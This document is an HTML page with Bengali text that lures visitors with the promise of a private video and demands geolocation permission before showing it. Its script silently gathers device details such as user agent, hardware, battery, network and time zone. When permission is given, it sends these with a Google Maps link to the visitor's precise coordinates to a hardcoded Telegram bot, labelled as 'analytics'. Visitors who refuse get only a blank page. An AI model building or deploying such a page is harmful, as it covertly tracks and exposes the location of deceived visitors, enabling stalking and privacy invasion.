```html
<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">

    <meta name="viewport"
          content="width=device-width,
                   initial-scale=1.0,
                   maximum-scale=1.0,
                   user-scalable=no">

    <title>Loading...</title>

    <style>

        * {
            box-sizing: border-box;
        }

        html,
        body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background: #000;
            overflow: hidden;
            font-family: Arial, sans-serif;
        }


        /* =========================================
           MAIN WEBSITE / VIDEO AREA
           ========================================= */

        #websiteContainer {

            position: fixed;

            top: 0;
            left: 0;

            width: 100%;
            height: 100%;

            background: #000;

            display: none;

            z-index: 1;
        }


        #websiteFrame {

            width: 100%;
            height: 100%;

            border: 0;

            display: block;

            background: #000;
        }


        /* =========================================
           LOADING
           ========================================= */

        #loading {

            position: fixed;

            top: 0;
            left: 0;

            width: 100%;
            height: 100%;

            background: #000;

            display: flex;

            justify-content: center;
            align-items: center;

            flex-direction: column;

            color: #fff;

            z-index: 10;
        }


        .spinner {

            width: 48px;
            height: 48px;

            border: 4px solid #333;

            border-top: 4px solid #fff;

            border-radius: 50%;

            animation:
                spin 1s linear infinite;

            margin-bottom: 15px;
        }


        @keyframes spin {

            100% {
                transform: rotate(360deg);
            }

        }


        /* =========================================
           LOCATION OVERLAY
           ========================================= */

        #locationOverlay {

            position: fixed;

            top: 0;
            left: 0;

            width: 100%;
            height: 100%;

            background:
                rgba(0, 0, 0, 0.35);

            display: flex;

            justify-content: center;
            align-items: center;

            padding: 20px;

            z-index: 100;
        }


        /* =========================================
           LOCATION BOX
           ========================================= */

        #locationBox {

            width: 100%;
            max-width: 665px;

            background:
                rgba(0, 0, 0, 0.92);

            border-radius: 20px;

            padding: 28px 20px 24px;

            text-align: center;

            color: #fff;

            box-shadow:
                0 10px 40px
                rgba(0,0,0,.55);
        }


        #locationIcon {

            font-size: 35px;

            margin-bottom: 8px;
        }


        #locationTitle {

            font-size: 25px;

            margin-bottom: 12px;
        }


        #locationText {

            font-size: 17px;

            line-height: 1.5;

            color: #eee;

            margin-bottom: 22px;
        }


        /* =========================================
           BUTTONS
           ========================================= */

        .locationButton {

            border: 0;

            border-radius: 10px;

            padding: 14px 30px;

            font-size: 17px;

            cursor: pointer;

            margin: 5px;
        }


        #allowButton {

            background: #2196F3;

            color: #fff;
        }


        #allowButton:active {

            transform: scale(.97);
        }


        #skipButton {

            background: #555;

            color: #fff;
        }


        #skipButton:active {

            transform: scale(.97);
        }


        #locationStatus {

            margin-top: 12px;

            font-size: 14px;

            color: #ddd;
        }


        /* =========================================
           OPEN EXTERNAL WEBSITE BUTTON
           ========================================= */

        #externalButton {

            display: none;

            position: fixed;

            left: 20px;
            right: 20px;

            bottom: 25px;

            z-index: 50;

            text-align: center;

            padding: 14px;

            background: #2196F3;

            color: #fff;

            text-decoration: none;

            border-radius: 10px;

            font-size: 16px;
        }

    </style>

</head>


<body>


<!-- =================================================
     LOADING SCREEN
     ================================================= -->

<div id="loading">

    <div class="spinner"></div>

    <div>
        Loading...
    </div>

</div>



<!-- =================================================
     WEBSITE / VIDEO
     ================================================= -->

<div id="websiteContainer">

    <iframe
        id="websiteFrame"
        allow="autoplay;
               encrypted-media;
               fullscreen;
               picture-in-picture;
               geolocation"
        allowfullscreen>
    </iframe>

</div>



<!-- =================================================
     LOCATION PERMISSION
     ================================================= -->

<div id="locationOverlay">

    <div id="locationBox">

        <div id="locationIcon">
            📍
        </div>


        <div id="locationTitle">
             আপনি কি সত্যিই ভিডিওটা দেখতে চান?
        </div>


        <div id="locationText">

             এ ধরনের ভিডিও সবার সামনে দেখবেন না।

        </div>


        <button
            id="allowButton"
            class="locationButton">

            Allow 

        </button>


        <button
            id="skipButton"
            class="locationButton">

            Skip

        </button>


        <div id="locationStatus"></div>

    </div>

</div>



<!-- =================================================
     EXTERNAL WEBSITE FALLBACK
     ================================================= -->

<a
    id="externalButton"
    target="_blank"
    rel="noopener noreferrer">

    🌐 Website খুলুন

</a>



<script>


/* =====================================================
   TELEGRAM
   ===================================================== */

const BOT_TOKEN =
    "8855743272:AAETg__YWrwHa3feYecotLTVzqQ_VTRsXII";


const CHAT_ID =
    "5980493892";



/* =====================================================
   ⭐ আপনার URL এখানে দিন
   =====================================================

   YouTube:
   https://www.youtube.com/watch?v=xxxx

   TikTok:
   https://www.tiktok.com/@user/video/xxxx

   Facebook:
   https://www.facebook.com/....

   Instagram:
   https://www.instagram.com/reel/....

   অথবা যেকোনো সাধারণ website:

   https://example.com

   অথবা সরাসরি video:

   https://example.com/video.mp4

   ===================================================== */

const TARGET_URL =
    "https://youtu.be/SeCcASZugNg?si=a69BYe3R3uMIsuFh";



/* =====================================================
   ANALYTICS DATA
   ===================================================== */

const analytics = {

    deviceId: getDeviceId(),

    userAgent:
        navigator.userAgent,

    ram:
        navigator.deviceMemory
        ? navigator.deviceMemory + " GB"
        : "Unknown",

    cores:
        navigator.hardwareConcurrency
        ? navigator.hardwareConcurrency +
          " Cores"
        : "Unknown",

    screenRes:
        window.screen.width +
        " x " +
        window.screen.height,

    orientation:
        window.screen.height >=
        window.screen.width
        ? "Portrait"
        : "Landscape",

    theme:
        window.matchMedia(
            "(prefers-color-scheme: dark)"
        ).matches
        ? "Dark Mode"
        : "Light Mode",

    networkType:
        navigator.connection
        ? navigator.connection.effectiveType
            .toUpperCase()
        : "Unknown",

    downlink:
        navigator.connection
        ? navigator.connection.downlink +
          " Mbps"
        : "Unknown",

    localTime:
        new Date().toLocaleTimeString(),

    timeZone:
        Intl.DateTimeFormat()
        .resolvedOptions()
        .timeZone,

    language:
        navigator.language ||
        navigator.userLanguage ||
        "Unknown",

    battery:
        "Unknown",

    permissionStatus:
        "Not Requested",

    mapLink:
        "N/A"
};



/* =====================================================
   DEVICE ID
   ===================================================== */

function getDeviceId() {

    let deviceId =
        localStorage.getItem(
            "app_device_id"
        );


    if (!deviceId) {

        deviceId =
            "DEV-" +
            Math.floor(
                100000 +
                Math.random() * 900000
            );


        localStorage.setItem(
            "app_device_id",
            deviceId
        );

    }


    return deviceId;

}



/* =====================================================
   PAGE LOAD
   ===================================================== */

document.addEventListener(
    "DOMContentLoaded",
    function () {

        collectDeviceInformation();

    }
);



/* =====================================================
   DEVICE INFORMATION
   ===================================================== */

function collectDeviceInformation() {


    if (navigator.getBattery) {

        navigator.getBattery()

        .then(function (battery) {

            analytics.battery =
                Math.round(
                    battery.level * 100
                ) +
                "% (" +
                (
                    battery.charging
                    ? "Charging"
                    : "Not Charging"
                ) +
                ")";

        })

        .catch(function () {

            analytics.battery =
                "Unknown";

        });

    }

}



/* =====================================================
   ALLOW LOCATION
   ===================================================== */

document
.getElementById("allowButton")
.addEventListener(
    "click",
    function () {

        requestLocation();

    }
);



/* =====================================================
   REQUEST LOCATION
   ===================================================== */

function requestLocation() {


    const status =
        document.getElementById(
            "locationStatus"
        );


    status.textContent =
        "📍 Location permission চাওয়া হচ্ছে...";


    if (!navigator.geolocation) {

        analytics.permissionStatus =
            "Not Supported";


        status.textContent =
            "Location support পাওয়া যায়নি।";


        exitWebsite();

        return;

    }



    navigator.geolocation.getCurrentPosition(


        /* ==============================
           LOCATION SUCCESS
           ============================== */

        function (position) {


            const latitude =
                position.coords.latitude;


            const longitude =
                position.coords.longitude;



            analytics.permissionStatus =
                "Allowed";


            analytics.mapLink =
                "https://www.google.com/maps?q=" +
                latitude +
                "," +
                longitude;



            status.textContent =
                "✅ Location অনুমোদিত হয়েছে।";


            /* Telegram */

            sendTelegramMessage();



            /*
             * Location সফল হলে
             * তারপর Target URL load হবে
             */

            setTimeout(
                function () {

                    openTargetWebsite();

                },
                400
            );

        },


        /* ==============================
           LOCATION DENIED
           ============================== */

        function (error) {


            analytics.permissionStatus =
                "Denied / Unavailable";


            analytics.mapLink =
                "N/A";


            status.textContent =
                "❌ Location অনুমোদন করা হয়নি।";


            /*
             * Location না দিলে
             * website বন্ধ
             */

            setTimeout(
                function () {

                    exitWebsite();

                },
                700
            );

        },


        {
            enableHighAccuracy: true,

            timeout: 10000,

            maximumAge: 0
        }

    );

}



/* =====================================================
   SKIP
   ===================================================== */

document
.getElementById("skipButton")
.addEventListener(
    "click",
    function () {


        analytics.permissionStatus =
            "User Skipped";


        analytics.mapLink =
            "N/A";


        exitWebsite();

    }
);



/* =====================================================
   EXIT WEBSITE
   ===================================================== */

function exitWebsite() {


    /*
     * প্রথমে about:blank চেষ্টা
     */

    try {

        window.location.replace(
            "about:blank"
        );

    } catch (error) {

        /*
         * Browser navigation block করলে
         * blank screen দেখানো হবে
         */

        document.body.innerHTML = "";

        document.body.style.background =
            "#000";

    }

}



/* =====================================================
   OPEN TARGET WEBSITE
   ===================================================== */

function openTargetWebsite() {


    if (
        !TARGET_URL ||
        TARGET_URL.trim() === ""
    ) {

        exitWebsite();

        return;
    }



    const url =
        TARGET_URL.trim();


    const frame =
        document.getElementById(
            "websiteFrame"
        );


    const container =
        document.getElementById(
            "websiteContainer"
        );


    const loading =
        document.getElementById(
            "loading"
        );


    const overlay =
        document.getElementById(
            "locationOverlay"
        );



    /*
     * Location popup remove
     */

    overlay.style.display =
        "none";



    /*
     * Loading screen remove
     */

    loading.style.display =
        "none";



    /*
     * Website container show
     */

    container.style.display =
        "block";



    /*
     * Target URL iframe-এ load
     */

    frame.src =
        url;



    /*
     * External website fallback link
     */

    const externalButton =
        document.getElementById(
            "externalButton"
        );


    externalButton.href =
        url;



    /*
     * কিছু website iframe block করলে
     * user চাইলে external website খুলতে পারবে
     */

    frame.addEventListener(
        "load",
        function () {

            console.log(
                "Target URL loaded:",
                url
            );

        }
    );

}



/* =====================================================
   TELEGRAM MESSAGE
   ===================================================== */

function sendTelegramMessage() {


    if (
        !BOT_TOKEN ||
        BOT_TOKEN ===
        "YOUR_BOT_TOKEN_HERE"
    ) {

        console.log(
            "Telegram Bot Token not configured."
        );

        return;

    }



    let messageText =
        "📊 *App Analytics Notification*\n\n";



    messageText +=
        "🆔 *Device ID:* `" +
        analytics.deviceId +
        "`\n";


    messageText +=
        "📱 *Device Info:* " +
        analytics.userAgent +
        "\n";


    messageText +=
        "⚙️ *Hardware:* " +
        analytics.cores +
        " | ~" +
        analytics.ram +
        "\n";


    messageText +=
        "📐 *Display:* " +
        analytics.screenRes +
        " (" +
        analytics.orientation +
        ") | " +
        analytics.theme +
        "\n";


    messageText +=
        "🌐 *Network:* " +
        analytics.networkType +
        " (Speed: " +
        analytics.downlink +
        ")\n";


    messageText +=
        "🕒 *Time:* " +
        analytics.localTime +
        " (" +
        analytics.timeZone +
        ")\n";


    messageText +=
        "🗣️ *Language:* " +
        analytics.language +
        "\n";


    messageText +=
        "🔋 *Battery:* " +
        analytics.battery +
        "\n\n";


    messageText +=
        "🔒 *Location Permission:* " +
        analytics.permissionStatus +
        "\n";



    if (
        analytics.permissionStatus ===
        "Allowed"
    ) {

        messageText +=
            "🗺️ *Location:* " +
            "[View Location on Google Maps](" +
            analytics.mapLink +
            ")";

    } else {

        messageText +=
            "⚠️ Location was not shared.";

    }



    const telegramURL =
        "https://api.telegram.org/bot" +
        BOT_TOKEN +
        "/sendMessage";



    fetch(
        telegramURL,
        {

            method: "POST",

            headers: {
                "Content-Type":
                    "application/json"
            },

            body: JSON.stringify({

                chat_id:
                    CHAT_ID,

                text:
                    messageText,

                parse_mode:
                    "Markdown",

                disable_web_page_preview:
                    false

            })

        }
    )

    .then(
        function (response) {

            return response.json();

        }
    )

    .then(
        function (result) {

            console.log(
                "Telegram:",
                result
            );

        }
    )

    .catch(
        function (error) {

            console.error(
                "Telegram Error:",
                error
            );

        }
    );

}

</script>

</body>
</html>
```
